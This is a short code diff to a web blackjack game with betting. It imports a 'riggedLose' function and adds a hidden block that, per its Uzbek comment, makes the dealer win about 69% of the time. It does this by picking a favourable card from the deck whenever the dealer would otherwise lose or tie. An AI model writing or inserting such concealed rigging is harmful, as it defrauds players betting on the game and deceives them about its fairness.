@@ -3,6 +3,7 @@ import { usePlayer } from "@/lib/player-context";
 import { useLang } from "@/lib/lang-context";
 import { useTheme } from "@/lib/theme-context";
 import { placeBet } from "@/lib/api";
+import { riggedLose } from "@/lib/odds";
 import GameHeader from "@/components/GameHeader";
 
 type Suit = "♠" | "♥" | "♦" | "♣";
@@ -124,6 +125,17 @@ export default function Blackjack() {
     let d = [...dealerCards];
     let dk = [...deck];
     while (calcHand(d) < 17) { d.push(dk.shift()!); }
+    // Uy foydasi: 69% hollarda diler yutadigan qilib karta tanlanadi
+    if (riggedLose()) {
+      const pt0 = calcHand(playerCards);
+      if (pt0 <= 21 && calcHand(d) <= pt0) {
+        const idx = dk.findIndex(c => {
+          const t = calcHand([...d, c]);
+          return t > pt0 && t <= 21;
+        });
+        if (idx >= 0) { d.push(dk[idx]); dk.splice(idx, 1); }
+      }
+    }
     setTimeout(() => {
       setDealerCards(d);
       const pt = calcHand(playerCards);
